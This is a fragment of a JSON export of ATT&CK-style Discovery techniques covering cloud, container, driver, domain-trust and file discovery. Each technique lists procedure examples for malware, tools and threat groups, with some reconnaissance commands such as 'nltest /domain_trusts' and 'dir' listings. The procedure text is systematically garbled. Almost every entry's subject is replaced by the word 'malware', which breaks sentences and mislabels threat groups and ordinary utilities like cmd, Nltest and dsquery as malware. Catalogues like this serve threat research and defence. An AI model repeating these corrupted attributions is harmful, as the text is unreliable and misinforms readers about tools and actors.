        "description": "An adversary may attempt to enumerate the cloud services running on a system after gaining access. These methods can differ from platform-as-a-service (PaaS), to infrastructure-as-a-service (IaaS), or software-as-a-service (SaaS). Many services exist throughout the various cloud providers and can include Continuous Integration and Continuous Delivery (CI/CD), Lambda Functions, Azure AD, etc. They may also include security services, such as AWS GuardDuty and Microsoft Defender for Cloud, and logging services, such as AWS CloudTrail and Google Cloud Audit Logs.Adversaries may attempt to discover information about the services enabled throughout the environment. Azure tools and APIs, such as the Azure AD Graph API and Azure Resource Manager API, can enumerate resources and services, including applications, management groups, resources and policy definitions, and their relationships that are accessible by an identity.[1][2]For example, Stormspotter is an open source tool for enumerating and constructing a graph for Azure resources and services, and Pacu is an open source AWS exploitation framework that supports several methods for discovering cloud services.[3][4]Adversaries may use the information gained to shape follow-on behaviors, such as targeting data or credentials from enumerated services or evading identified defenses through Disable or Modify Tools or Disable or Modify Cloud Logs.",
        "Procedure": {
            "S0677": {
                "ID": "S0677",
                "Name": "AADInternals",
                "Description": "malware can enumerate information about a variety of cloud services, such as Office 365 and Sharepoint instances or OpenID Configurations.[5]"
            },
            "S1091": {
                "ID": "S1091",
                "Name": "Pacu",
                "Description": "malware can enumerate AWS services, such as CloudTrail and CloudWatch.[4]"
            },
            "S0684": {
                "ID": "S0684",
                "Name": "ROADTools",
                "Description": "malware can enumerate Azure AD applications and service principals.[6]"
            }
        }
    },
    "T1619": {
        "ttp_name": "Cloud Storage Object Discovery",
        "ttp_id": "T1619",
        "href": "/techniques/T1619",
        "tactic": "Discovery",
        "description": "Adversaries may enumerate objects in cloud storage infrastructure. Adversaries may use this information during automated discovery to shape follow-on behaviors, including requesting all or specific objects from cloud storage.  Similar to File and Directory Discovery on a local host, after identifying available storage services (i.e. Cloud Infrastructure Discovery) adversaries may access the contents/objects stored in cloud infrastructure.Cloud service providers offer APIs allowing users to enumerate objects stored within cloud storage. Examples include ListObjectsV2 in AWS [1] and List Blobs in Azure[2] .",
        "Procedure": {
            "S1091": {
                "ID": "S1091",
                "Name": "Pacu",
                "Description": "malware can enumerate AWS storage services, such as S3 buckets and Elastic Block Store volumes.[3]"
            },
            "S0683": {
                "ID": "S0683",
                "Name": "Peirates",
                "Description": "malware can list AWS S3 buckets.[4]"
            }
        }
    },
    "T1613": {
        "ttp_name": "Container and Resource Discovery",
        "ttp_id": "T1613",
        "href": "/techniques/T1613",
        "tactic": "Discovery",
        "description": "Adversaries may attempt to discover containers and other resources that are available within a containers environment. Other resources may include images, deployments, pods, nodes, and other information such as the status of a cluster.These resources can be viewed within web applications such as the Kubernetes dashboard or can be queried via the Docker and Kubernetes APIs.[1][2] In Docker, logs may leak information about the environment, such as the environment\u2019s configuration, which services are available, and what cloud provider the victim may be utilizing. The discovery of these resources may inform an adversary\u2019s next steps in the environment, such as how to perform lateral movement and which methods to utilize for execution.",
        "Procedure": {
            "S0601": {
                "ID": "S0601",
                "Name": "Hildegard",
                "Description": "malware has used masscan to search for kubelets and the kubelet API for additional running containers.[3]"
            },
            "S0683": {
                "ID": "S0683",
                "Name": "Peirates",
                "Description": "malware can enumerate Kubernetes pods in a given namespace.[4]"
            },
            "G0139": {
                "ID": "G0139",
                "Name": "TeamTNT",
                "Description": "malware has checked for running containers with docker ps and for specific container names with docker inspect.[5] malware has also searched for Kubernetes pods running in a local network.[6]"
            }
        }
    },
    "T1652": {
        "ttp_name": "Device Driver Discovery",
        "ttp_id": "T1652",
        "href": "/techniques/T1652",
        "tactic": "Discovery",
        "description": "Adversaries may attempt to enumerate local device drivers on a victim host. Information about device drivers may highlight various insights that shape follow-on behaviors, such as the function/purpose of the host, present security tools (i.e. Security Software Discovery) or other defenses (e.g., Virtualization/Sandbox Evasion), as well as potential exploitable vulnerabilities (e.g., Exploitation for Privilege Escalation).Many OS utilities may provide information about local device drivers, such as driverquery.exe and the EnumDeviceDrivers() API function on Windows.[1][2] Information about device drivers (as well as associated services, i.e., System Service Discovery) may also be available in the Registry.[3]On Linux/macOS, device drivers (in the form of kernel modules) may be visible within /dev or using utilities such as lsmod and modinfo.[4][5][6]",
        "Procedure": {
            "S0376": {
                "ID": "S0376",
                "Name": "HOPLIGHT",
                "Description": "malware can enumerate device drivers located in the registry at HKLM\\Software\\WBEM\\WDM.[7]"
            },
            "S0125": {
                "ID": "S0125",
                "Name": "Remsec",
                "Description": "malware has a plugin to detect active drivers of some security products.[8]"
            }
        }
    },
    "T1482": {
        "ttp_name": "Domain Trust Discovery",
        "ttp_id": "T1482",
        "href": "/techniques/T1482",
        "tactic": "Discovery",
        "description": "Adversaries may attempt to gather information on domain trust relationships that may be used to identify lateral movement opportunities in Windows multi-domain/forest environments. Domain trusts provide a mechanism for a domain to allow access to resources based on the authentication procedures of another domain.[1] Domain trusts allow the users of the trusted domain to access resources in the trusting domain. The information discovered may help the adversary conduct SID-History Injection, Pass the Ticket, and Kerberoasting.[2][3] Domain trusts can be enumerated using the DSEnumerateDomainTrusts() Win32 API call, .NET methods, and LDAP.[3] The Windows utility Nltest is known to be used by adversaries to enumerate domain trusts.[4]",
        "Procedure": {
            "S0552": {
                "ID": "S0552",
                "Name": "AdFind",
                "Description": "malware can gather information about organizational units (OUs) and domain trusts from Active Directory.[5][6][7][8]"
            },
            "G1024": {
                "ID": "G1024",
                "Name": "Akira",
                "Description": "malware uses the built-in Nltest utility or tools such as AdFind to enumerate Active Directory trusts in victim environments.[9]"
            },
            "S1081": {
                "ID": "S1081",
                "Name": "BADHATCH",
                "Description": "malware can use nltest.exe /domain_trusts to discover domain trust relationships on a compromised machine.[10]"
            },
            "S0534": {
                "ID": "S0534",
                "Name": "Bazar",
                "Description": "malware can use Nltest tools to obtain information about the domain.[11][12]"
            },
            "S0521": {
                "ID": "S0521",
                "Name": "BloodHound",
                "Description": "malware has the ability to map domain trusts and identify misconfigurations for potential abuse.[13]"
            },
            "S1063": {
                "ID": "S1063",
                "Name": "Brute Ratel C4",
                "Description": "malware can use LDAP queries and nltest /domain_trusts for domain trust discovery.[14][15]"
            },
            "C0015": {
                "ID": "C0015",
                "Name": "C0015",
                "Description": "During malware, the threat actors used the command nltest /domain_trusts /all_trusts to enumerate domain trusts.[16]"
            },
            "G0114": {
                "ID": "G0114",
                "Name": "Chimera",
                "Description": "malware has nltest /domain_trusts to identify domain trust relationships.[17]"
            },
            "S0105": {
                "ID": "S0105",
                "Name": "dsquery",
                "Description": "malware can be used to gather information on domain trusts with malware * -filter \"(objectClass=trustedDomain)\" -attr *.[3]"
            },
            "G1006": {
                "ID": "G1006",
                "Name": "Earth Lusca",
                "Description": "malware has used Nltest to obtain information about domain controllers.[18]"
            },
            "S0363": {
                "ID": "S0363",
                "Name": "Empire",
                "Description": "malware has modules for enumerating domain trusts.[19]"
            },
            "G0061": {
                "ID": "G0061",
                "Name": "FIN8",
                "Description": "malware has retrieved a list of trusted domains by using nltest.exe /domain_trusts.[20]"
            },
            "G0059": {
                "ID": "G0059",
                "Name": "Magic Hound",
                "Description": "malware has used a web shell to execute nltest /trusted_domains to identify trust relationships.[21]"
            },
            "S0359": {
                "ID": "S0359",
                "Name": "Nltest",
                "Description": "malware may be used to enumerate trusted domains by using commands such as nltest /domain_trusts.[22][23]"
            },
            "S0378": {
                "ID": "S0378",
                "Name": "PoshC2",
                "Description": "malware has modules for enumerating domain trusts.[24]"
            },
            "S0194": {
                "ID": "S0194",
                "Name": "PowerSploit",
                "Description": "malware has modules such as Get-NetDomainTrust and Get-NetForestTrust to enumerate domain and forest trusts.[25][26]"
            },
            "S0650": {
                "ID": "S0650",
                "Name": "QakBot",
                "Description": "malware can run nltest /domain_trusts /all_trusts for domain trust discovery.[27]"
            },
            "S1071": {
                "ID": "S1071",
                "Name": "Rubeus",
                "Description": "malware can gather information about domain trusts.[28][29]"
            },
            "S1124": {
                "ID": "S1124",
                "Name": "SocGholish",
                "Description": "malware can profile compromised systems to identify domain trust relationships.[30][31]"
            },
            "C0024": {
                "ID": "C0024",
                "Name": "SolarWinds Compromise",
                "Description": "During the malware, APT29 used the Get-AcceptedDomain PowerShell cmdlet to enumerate accepted domains through an Exchange Management Shell.[32] They also used AdFind to enumerate domains and to discover trust between federated domains.[33][34]"
            },
            "S0266": {
                "ID": "S0266",
                "Name": "TrickBot",
                "Description": "malware can gather information about domain trusts by utilizing Nltest.[23][35]"
            }
        }
    },
    "T1083": {
        "ttp_name": "File and Directory Discovery",
        "ttp_id": "T1083",
        "href": "/techniques/T1083",
        "tactic": "Discovery",
        "description": "Adversaries may enumerate files and directories or may search in specific locations of a host or network share for certain information within a file system. Adversaries may use the information from File and Directory Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.Many command shell utilities can be used to obtain this information. Examples include dir, tree, ls, find, and locate.[1] Custom tools may also be used to gather file and directory information and interact with the Native API. Adversaries may also leverage a Network Device CLI on network devices to gather file and directory information (e.g. dir, show flash, and/or nvram).[2]Some files and directories may require elevated or specific user permissions to access.",
        "Procedure": {
            "S0066": {
                "ID": "S0066",
                "Name": "3PARA RAT",
                "Description": "malware has a command to retrieve metadata for files on disk as well as a command to list the current working directory.[3]"
            },
            "S0065": {
                "ID": "S0065",
                "Name": "4H RAT",
                "Description": "malware has the capability to obtain file and directory listings.[3]"
            },
            "S1125": {
                "ID": "S1125",
                "Name": "AcidRain",
                "Description": "malware identifies specific files and directories in the Linux operating system associated with storage devices.[4]"
            },
            "S1028": {
                "ID": "S1028",
                "Name": "Action RAT",
                "Description": "malware has the ability to collect drive and file information on an infected machine.[5]"
            },
            "G0018": {
                "ID": "G0018",
                "Name": "admin@338",
                "Description": "malware actors used the following commands after exploiting a machine with LOWBALL malware to obtain information about files and directories: dir c:\\ >> %temp%\\download dir \"c:\\Documents and Settings\" >> %temp%\\download dir \"c:\\Program Files\\\" >> %temp%\\download dir d:\\ >> %temp%\\download[6]"
            },
            "S0045": {
                "ID": "S0045",
                "Name": "ADVSTORESHELL",
                "Description": "malware can list files and directories.[7][8]"
            },
            "S1129": {
                "ID": "S1129",
                "Name": "Akira",
                "Description": "malware examines files prior to encryption to determine if they meet requirements for encryption and can be encrypted by the ransomware. These checks are performed through native Windows functions such as GetFileAttributesW.[9]"
            },
            "S1025": {
                "ID": "S1025",
                "Name": "Amadey",
                "Description": "malware has searched for folders associated with antivirus software.[10]"
            },
            "G1007": {
                "ID": "G1007",
                "Name": "Aoqin Dragon",
                "Description": "malware has run scripts to identify file formats including Microsoft Word.[11]"
            },
            "S0622": {
                "ID": "S0622",
                "Name": "AppleSeed",
                "Description": "malware has the ability to search for .txt, .ppt, .hwp, .pdf, and .doc files in specified directories.[12]"
            },
            "G0026": {
                "ID": "G0026",
                "Name": "APT18",
                "Description": "malware can list files information for specific directories.[13]"
            },
            "G0007": {
                "ID": "G0007",
                "Name": "APT28",
                "Description": "malware has used Forfiles to locate PDF, Excel, and Word documents during collection. The group also searched a compromised DCCC computer for specific terms.[14][15]"
            },
            "G0022": {
                "ID": "G0022",
                "Name": "APT3",
                "Description": "malware has a tool that looks for files and directories on the local file system.[16][17]"
            },
            "G0050": {
                "ID": "G0050",
                "Name": "APT32",
                "Description": "malware's backdoor possesses the capability to list files and directories on a machine. [18]"
            },
            "G0082": {
                "ID": "G0082",
                "Name": "APT38",
                "Description": "malware have enumerated files and directories, or searched in specific locations within a compromised host.[19]"
            },
            "G0087": {
                "ID": "G0087",
                "Name": "APT39",
                "Description": "malware has used tools with the ability to search for files on a compromised host.[20]"
            },
            "G0096": {
                "ID": "G0096",
                "Name": "APT41",
                "Description": "malware has executed file /bin/pwd on exploited victims, perhaps to return architecture related information.[21]"
            },
            "G1023": {
                "ID": "G1023",
                "Name": "APT5",
                "Description": "malware has used the BLOODMINE utility to discover files with .css, .jpg, .png, .gif, .ico, .js, and .jsp extensions in Pulse Secure Connect logs.[22]"
            },
            "S0456": {
                "ID": "S0456",
                "Name": "Aria-body",
                "Description": "malware has the ability to gather metadata from a file and to search for file and directory names.[23]"
            },
            "S0438": {
                "ID": "S0438",
                "Name": "Attor",
                "Description": "malware has a plugin that enumerates files with specific extensions on all hard disk drives and stores file information in encrypted log files.[24]"
            },
            "S0347": {
                "ID": "S0347",
                "Name": "AuditCred",
                "Description": "malware can search through folders and files on the system.[25]"
            },
            "S0129": {
                "ID": "S0129",
                "Name": "AutoIt backdoor",
                "Description": "malware is capable of identifying documents on the victim with the following extensions: .doc; .pdf, .csv, .ppt, .docx, .pst, .xls, .xlsx, .pptx, and .jpeg.[26]"
            },
            "S0640": {
                "ID": "S0640",
                "Name": "Avaddon",
                "Description": "malware has searched for specific files prior to encryption.[27]"
            },
            "S0473": {
                "ID": "S0473",
                "Name": "Avenger",
                "Description": "malware has the ability to browse files in directories such as Program Files and the Desktop.[28]"
            },
            "S1053": {
                "ID": "S1053",
                "Name": "AvosLocker",
                "Description": "malware has searched for files and directories on a compromised network.[29][30]"
            },
            "S0344": {
                "ID": "S0344",
                "Name": "Azorult",
                "Description": "malware can recursively search for files in folders and collects files from the desktop with certain extensions.[31]"
            },
            "S0638": {
                "ID": "S0638",
                "Name": "Babuk",
                "Description": "malware has the ability to enumerate files on a targeted system.[32][33]"
            },
            "S0414": {
                "ID": "S0414",
                "Name": "BabyShark",
                "Description": "malware has used dir to search for \"programfiles\" and \"appdata\".[34]"
            },
            "S0475": {
                "ID": "S0475",
                "Name": "BackConfig",
                "Description": "malware has the ability to identify folders and files related to previous infections.[35]"
            },
            "S0093": {
                "ID": "S0093",
                "Name": "Backdoor.Oldrea",
                "Description": "malware collects information about available drives, default browser, desktop file list, My Documents, Internet history, program files, and root of available drives. It also searches for ICS-related software files.[36]"
            },
            "S0031": {
                "ID": "S0031",
                "Name": "BACKSPACE",
                "Description": "malware allows adversaries to search for files.[37]"
            },
            "S0642": {
                "ID": "S0642",
                "Name": "BADFLICK",
                "Description": "malware has searched for files on the infected host.[38]"
            },
            "S0128": {
                "ID": "S0128",
                "Name": "BADNEWS",
                "Description": "malware identifies files with certain extensions from USB devices, then copies them to a predefined directory.[39]"
            },
            "S0337": {
                "ID": "S0337",
                "Name": "BadPatch",
                "Description": "malware searches for files with specific file extensions.[40]"
            },
            "S0234": {
                "ID": "S0234",
                "Name": "Bandook",
                "Description": "malware has a command to list files on a system.[41]"
            },
            "S0239": {
                "ID": "S0239",
                "Name": "Bankshot",
                "Description": "malware searches for files on the victim's machine.[42]"
            },
            "S0534": {
                "ID": "S0534",
                "Name": "Bazar",
                "Description": "malware can enumerate the victim's desktop.[43][44]"
            },
            "S0127": {
                "ID": "S0127",
                "Name": "BBSRAT",
                "Description": "malware can list file and directory information.[45]"
            },
            "S0268": {
                "ID": "S0268",
                "Name": "Bisonal",
                "Description": "malware can retrieve a file listing from the system.[46][47]"
            },
            "S1070": {
                "ID": "S1070",
                "Name": "Black Basta",
                "Description": "malware can enumerate specific files for encryption.[48][49][50][51][52][53][54][55]"
            },
            "S1068": {
                "ID": "S1068",
                "Name": "BlackCat",
                "Description": "malware can enumerate files for encryption.[56]"
            },
            "S0069": {
                "ID": "S0069",
                "Name": "BLACKCOFFEE",
                "Description": "malware has the capability to enumerate files.[57]"
            },
            "S0089": {
                "ID": "S0089",
                "Name": "BlackEnergy",
                "Description": "malware gathers a list of installed apps from the uninstall program Registry. It also gathers registered mail, browser, and instant messaging clients from the Registry. malware has searched for given file types.[58][59]"
            },
            "S0564": {
                "ID": "S0564",
                "Name": "BlackMould",
                "Description": "malware has the ability to find files on the targeted system.[60]"
            },
            "S0520": {
                "ID": "S0520",
                "Name": "BLINDINGCAN",
                "Description": "malware can search, read, write, move, and execute files.[61][62]"
            },
            "S0657": {
                "ID": "S0657",
                "Name": "BLUELIGHT",
                "Description": "malware can enumerate files and collect associated metadata.[63]"
            },
            "S0635": {
                "ID": "S0635",
                "Name": "BoomBox",
                "Description": "malware can search for specific files and directories on a machine.[64]"
            },
            "S0651": {
                "ID": "S0651",
                "Name": "BoxCaon",
                "Description": "malware has searched for files on the system, such as documents located in the desktop folder.[65]"
            },
            "S0252": {
                "ID": "S0252",
                "Name": "Brave Prince",
                "Description": "malware gathers file and directory information from the victim\u2019s machine.[66]"
            },
            "G0060": {
                "ID": "G0060",
                "Name": "BRONZE BUTLER",
                "Description": "malware has collected a list of files from the victim and uploaded it to its C2 server, and then created a new list of specific files to steal.[67]"
            },
            "C0015": {
                "ID": "C0015",
                "Name": "C0015",
                "Description": "During malware, the threat actors conducted a file listing discovery against multiple hosts to ensure locker encryption was successful.[68]"
            },
            "S0693": {
                "ID": "S0693",
                "Name": "CaddyWiper",
                "Description": "malware can enumerate all files and directories on a compromised host.[69]"
            },
            "S0351": {
                "ID": "S0351",
                "Name": "Cannon",
                "Description": "malware can obtain victim drive information as well as a list of folders in C:\\Program Files.[70]"
            },
            "S0348": {
                "ID": "S0348",
                "Name": "Cardinal RAT",
                "Description": "malware checks its current working directory upon execution and also contains watchdog functionality that ensures its executable is located in the correct path (else it will rewrite the payload).[71]"
            },
            "S0572": {
                "ID": "S0572",
                "Name": "Caterpillar WebShell",
                "Description": "malware can search for files in directories.[72]"
            },
            "S1043": {
                "ID": "S1043",
                "Name": "ccf32",
                "Description": "malware can parse collected files to identify specific file extensions.[73]"
            },
            "S0674": {
                "ID": "S0674",
                "Name": "CharmPower",
                "Description": "malware can enumerate drives and list the contents of the C: drive on a victim's computer.[74]"
            },
            "S0144": {
                "ID": "S0144",
                "Name": "ChChes",
                "Description": "malware collects the victim's %TEMP% directory path and version of Internet Explorer.[75]"
            },
            "S1096": {
                "ID": "S1096",
                "Name": "Cheerscrypt",
                "Description": "malware can search for log and VMware-related files with .log, .vmdk, .vmem, .vswp, and .vmsn extensions.[76]"
            },
            "G0114": {
                "ID": "G0114",
                "Name": "Chimera",
                "Description": "malware has utilized multiple commands to identify data of interest in file and directory listings.[77]"
            },
            "S0020": {
                "ID": "S0020",
                "Name": "China Chopper",
                "Description": "malware's server component can list directory contents.[78][79]"
            },
            "S0023": {
                "ID": "S0023",
                "Name": "CHOPSTICK",
                "Description": "An older version of malware has a module that monitors all mounted volumes for files with the extensions .doc, .docx, .pgp, .gpg, .m2f, or .m2o.[7]"
            },
            "S0660": {
                "ID": "S0660",
                "Name": "Clambling",
                "Description": "malware can browse directories on a compromised host.[80][81]"
            },
            "S0611": {
                "ID": "S0611",
                "Name": "Clop",
                "Description": "malware has searched folders and subfolders for files to encrypt.[82]"
            },
            "S0106": {
                "ID": "S0106",
                "Name": "cmd",
                "Description": "malware can be used to find files and directories with native functionality such as dir commands.[83]"
            },
            "S1105": {
                "ID": "S1105",
                "Name": "COATHANGER",
                "Description": "malware will survey the contents of system files during installation.[84]"
            },
            "S0154": {
                "ID": "S0154",
                "Name": "Cobalt Strike",
                "Description": "malware can explore files on a compromised system.[85]"
            },
            "G0142": {
                "ID": "G0142",
                "Name": "Confucius",
                "Description": "malware has used a file stealer that checks the Document, Downloads, Desktop, and Picture folders for documents and images with specific extensions.[86]"
            },
            "S0575": {
                "ID": "S0575",
                "Name": "Conti",
                "Description": "malware can discover files on a local system.[87]"
            },
            "S0492": {
                "ID": "S0492",
                "Name": "CookieMiner",
                "Description": "malware has looked for files in the user's home directory with \"wallet\" in their name using find.[88]"
            },
            "S0212": {
                "ID": "S0212",
                "Name": "CORALDECK",
                "Description": "malware searches for specified files.[89]"
            },
            "S0050": {
                "ID": "S0050",
                "Name": "CosmicDuke",
                "Description": "malware searches attached and mounted drives for file extensions and keywords that match a predefined list.[90]"
            },
            "S0488": {
                "ID": "S0488",
                "Name": "CrackMapExec",
                "Description": "malware can discover specified filetypes and log files on a targeted system.[91]"
            },
            "S1023": {
                "ID": "S1023",
                "Name": "CreepyDrive",
                "Description": "malware can specify the local file path to upload files from.[92]"
            },
            "S0115": {
                "ID": "S0115",
                "Name": "Crimson",
                "Description": "malware contains commands to list files and directories, as well as search for files matching certain extensions from a defined list.[93][94][95]"
            },
            "S0235": {
                "ID": "S0235",
                "Name": "CrossRAT",
                "Description": "malware can list all files on a system.[96]"
            },
            "S0498": {
                "ID": "S0498",
                "Name": "Cryptoistic",
                "Description": "malware can scan a directory to identify files for deletion.[97]"
            },
            "S0625": {
                "ID": "S0625",
                "Name": "Cuba",
                "Description": "malware can enumerate files by using a variety of functions.[98]"
            },
            "S0687": {
                "ID": "S0687",
                "Name": "Cyclops Blink",
                "Description": "malware can use the Linux API statvfs to enumerate the current working directory.[99][100]"
            },
            "S0497": {
                "ID": "S0497",
                "Name": "Dacls",
                "Description": "malware can scan directories on a compromised host.[101]"
            },
            "G0070": {
                "ID": "G0070",
                "Name": "Dark Caracal",
                "Description": "malware collected file listings of all default Windows directories.[96]"
            },
            "S1111": {
                "ID": "S1111",
                "Name": "DarkGate",
                "Description": "Some versions of malware search for the hard-coded folder C:\\Program Files\\e Carte Bleue.[102]"
            },
            "G0012": {
                "ID": "G0012",
                "Name": "Darkhotel",
                "Description": "malware has used malware that searched for files with specific patterns.[103]"
            },
            "S0673": {
                "ID": "S0673",
                "Name": "DarkWatchman",
                "Description": "malware has the ability to enumerate file and folder names.[104]"
            },
            "S0255": {
                "ID": "S0255",
                "Name": "DDKONG",
                "Description": "malware lists files on the victim\u2019s machine.[105]"
            },
            "S0616": {
                "ID": "S0616",
                "Name": "DEATHRANSOM",
                "Description": "malware can use loop operations to enumerate directories on a compromised host.[106]"
            },
            "S0354": {
                "ID": "S0354",
                "Name": "Denis",
                "Description": "malware has several commands to search directories for files.[107][108]"
            },
            "S0021": {
                "ID": "S0021",
                "Name": "Derusbi",
                "Description": "malware is capable of obtaining directory, file, and drive listings.[109][78]"
            },
            "S0659": {
                "ID": "S0659",
                "Name": "Diavol",
                "Description": "malware has a command to traverse the files and directories in a given path.[110]"
            },
            "S0600": {
                "ID": "S0600",
                "Name": "Doki",
                "Description": "malware has resolved the path of a process PID to use as a script argument.[111]"
            },
            "S0472": {
                "ID": "S0472",
                "Name": "down_new",
                "Description": "malware has the ability to list the directories on a compromised host.[28]"
            },
            "G0035": {
                "ID": "G0035",
                "Name": "Dragonfly",
                "Description": "malware has used a batch script to gather folder and file names from victim hosts.[112][113][114]"
            },
            "S0547": {
                "ID": "S0547",
                "Name": "DropBook",
                "Description": "malware can collect the names of all files and folders in the Program Files directories.[115][116]"
            },
            "S0567": {
                "ID": "S0567",
                "Name": "Dtrack",
                "Description": "malware can list files on available disk volumes.[117][118]"
            },
            "S0062": {
                "ID": "S0062",
                "Name": "DustySky",
                "Description": "malware scans the victim for files that contain certain keywords and document types including PDF, DOC, DOCX, XLS, and XLSX, from a list that is obtained from the C2 as a text file. It can also identify logical drives for the infected machine.[119][120]"
            },
            "S0377": {
                "ID": "S0377",
                "Name": "Ebury",
                "Description": "malware can list directory entries.[121]"
            },
            "S0081": {
                "ID": "S0081",
                "Name": "Elise",
                "Description": "A variant of malware executes dir C:\\progra~1 when initially run.[122][123]"
            },
            "S0064": {
                "ID": "S0064",
                "Name": "ELMER",
                "Description": "malware is capable of performing directory listings.[124]"
            },
            "S0363": {
                "ID": "S0363",
                "Name": "Empire",
                "Description": "malware includes various modules for finding files of interest on hosts and network shares.[125]"
            },
            "S0091": {
                "ID": "S0091",
                "Name": "Epic",
                "Description": "malware recursively searches for all .doc files on the system and collects a directory listing of the Desktop, %TEMP%, and %WINDOWS%\\Temp directories.[126][127]"
            },
            "S0181": {
                "ID": "S0181",
                "Name": "FALLCHILL",
                "Description": "malware can search files on a victim.[128]"
            },
            "S0512": {
                "ID": "S0512",
                "Name": "FatDuke",
                "Description": "malware can enumerate directories on target machines.[129]"
            },
            "G1016": {
                "ID": "G1016",
                "Name": "FIN13",
                "Description": "malware has used the Windows dir command to enumerate files and directories in a victim's network.[130]"
            },
            "S0182": {
                "ID": "S0182",
                "Name": "FinFisher",
                "Description": "malware enumerates directories and scans for certain files.[131][132]"
            },
            "S0618": {
                "ID": "S0618",
                "Name": "FIVEHANDS",
                "Description": "malware has the ability to enumerate files on a compromised host in order to encrypt files with specific extensions.[133][134]"
            },
            "S0036": {
                "ID": "S0036",
                "Name": "FLASHFLOOD",
                "Description": "malware searches for interesting files (either a default or customized set of file extensions) on the local system and removable media.[37]"
            },
            "S0661": {
                "ID": "S0661",
                "Name": "FoggyWeb",
                "Description": "malware's loader can check for the malware backdoor .pri file on a compromised AD FS server.[135]"
            },
            "S0193": {
                "ID": "S0193",
                "Name": "Forfiles",
                "Description": "malware can be used to locate certain types of files/directories in a system.(ex: locate all files with a specific extension, name, and/or age)[14]"
            },
            "G0117": {
                "ID": "G0117",
                "Name": "Fox Kitten",
                "Description": "malware has used WizTree to obtain network files and directory listings.[136]"
            },
            "S0277": {
                "ID": "S0277",
                "Name": "FruitFly",
                "Description": "malware looks for specific files and file types.[137]"
            },
            "S1044": {
                "ID": "S1044",
                "Name": "FunnyDream",
                "Description": "malware can identify files with .doc, .docx, .ppt, .pptx, .xls, .xlsx, and .pdf extensions and specific timestamps for collection.[73]"
            },
            "S0628": {
                "ID": "S0628",
                "Name": "FYAnti",
                "Description": "malware can search the C:\\Windows\\Microsoft.NET\\ directory for files of a specified size.[138]"
            },
            "S0410": {
                "ID": "S0410",
                "Name": "Fysbis",
                "Description": "malware has the ability to search for files.[139]"
            },
            "G0047": {
                "ID": "G0047",
                "Name": "Gamaredon Group",
                "Description": "malware macros can scan for Microsoft Word and Excel files to inject with additional malicious macros. malware has also used its backdoors to automatically list interesting files (such as Office documents) found on a system.[140][141]"
            },
            "S0666": {
                "ID": "S0666",
                "Name": "Gelsemium",
                "Description": "malware can retrieve data from specific Windows directories, as well as open random files as part of Virtualization/Sandbox Evasion.[142]"
            },
            "S0049": {
                "ID": "S0049",
                "Name": "GeminiDuke",
                "Description": "malware collects information from the victim, including installed drivers, programs previously executed by users, programs and services configured to automatically run at startup, files and folders present in any user's home folder, files and folders present in any user's My Documents, programs installed to the Program Files folder, and recently accessed files, folders, and programs.[143]"
            },
            "S0249": {
                "ID": "S0249",
                "Name": "Gold Dragon",
                "Description": "malware lists the directories for Desktop, program files, and the user\u2019s recently accessed files.[66]"
            },
            "S0493": {
                "ID": "S0493",
                "Name": "GoldenSpy",
                "Description": "malware has included a program \"ExeProtector\", which monitors for the existence of malware on the infected system and redownloads if necessary.[144]"
            },
            "S0237": {
                "ID": "S0237",
                "Name": "GravityRAT",
                "Description": "malware collects the volumes mapped on the system, and also steals files with the following extensions: .docx, .doc, .pptx, .ppt, .xlsx, .xls, .rtf, and .pdf.[145]"
            },
            "S0632": {
                "ID": "S0632",
                "Name": "GrimAgent",
                "Description": "malware has the ability to enumerate files and directories on a compromised host.[146]"
            },
            "G0125": {
                "ID": "G0125",
                "Name": "HAFNIUM",
                "Description": "malware has searched file contents on a compromised host.[79]"
            },
            "S0697": {
                "ID": "S0697",
                "Name": "HermeticWiper",
                "Description": "malware can enumerate common folders such as My Documents, Desktop, and AppData.[147][148]"
            },
            "S1027": {
                "ID": "S1027",
                "Name": "Heyoka Backdoor",
                "Description": "malware has the ability to search the compromised host for files.[11]"
            },
            "S0376": {
                "ID": "S0376",
                "Name": "HOPLIGHT",
                "Description": "malware has been observed enumerating system drives and partitions.[149]"
            },
            "S0431": {
                "ID": "S0431",
                "Name": "HotCroissant",
                "Description": "malware has the ability to retrieve a list of files in a given directory as well as drives and drive types.[150]"
            },
            "S0070": {
                "ID": "S0070",
                "Name": "HTTPBrowser",
                "Description": "malware is capable of listing files, folders, and drives on a victim.[151][152]"
            },
            "S0203": {
                "ID": "S0203",
                "Name": "Hydraq",
                "Description": "malware creates a backdoor through which remote attackers can check for the existence of files, including its own components, as well as retrieve a list of logical drives.[153][154]"
            },
            "S1022": {
                "ID": "S1022",
                "Name": "IceApple",
                "Description": "The malware Directory Lister module can list information about files and directories including creation time, last write time, name, and size.[155]"
            },
            "S0434": {
                "ID": "S0434",
                "Name": "Imminent Monitor",
                "Description": "malware has a dynamic debugging feature to check whether it is located in the %TEMP% directory, otherwise it copies itself there.[156]"
            },
            "G0100": {
                "ID": "G0100",
                "Name": "Inception",
                "Description": "malware used a file listing plugin to collect information about file and directories both on local and remote drives.[157]"
            },
            "S0604": {
                "ID": "S0604",
                "Name": "Industroyer",
                "Description": "malware\u2019s data wiper component enumerates specific files on all the Windows drives.[158]"
            },
            "S0259": {
                "ID": "S0259",
                "Name": "InnaputRAT",
                "Description": "malware enumerates directories and obtains file attributes on a system.[159]"
            },
            "S0260": {
                "ID": "S0260",
                "Name": "InvisiMole",
                "Description": "malware can list information about files in a directory and recently opened or used documents. malware can also search for specific files by supplied file mask.[160]"
            },
            "S0015": {
                "ID": "S0015",
                "Name": "Ixeshe",
                "Description": "malware can list file and directory information.[161]"
            },
            "S0201": {
                "ID": "S0201",
                "Name": "JPIN",
                "Description": "malware can enumerate drives and their types. It can also change file permissions using cacls.exe.[162]"
            },
            "S0283": {
                "ID": "S0283",
                "Name": "jRAT",
                "Description": "malware can browse file systems.[163][164]"
            },
            "S0088": {
                "ID": "S0088",
                "Name": "Kasidet",
                "Description": "malware has the ability to search for a given filename on a victim.[165]"
            },
            "S0265": {
                "ID": "S0265",
                "Name": "Kazuar",
                "Description": "malware finds a specified directory, lists the files and metadata about those files.[166]"
            },
            "G0004": {
                "ID": "G0004",
                "Name": "Ke3chang",
                "Description": "malware uses command-line interaction to search files and directories.[167][168]"
            },
            "S0387": {
                "ID": "S0387",
                "Name": "KeyBoy",
                "Description": "malware has a command to launch a file browser or explorer on the system.[169]"
            },
            "S0271": {
                "ID": "S0271",
                "Name": "KEYMARBLE",
                "Description": "malware has a command to search for files on the victim\u2019s machine.[170]"
            },
            "S0526": {
                "ID": "S0526",
                "Name": "KGH_SPY",
                "Description": "malware can enumerate files and directories on a compromised host.[171]"
            },
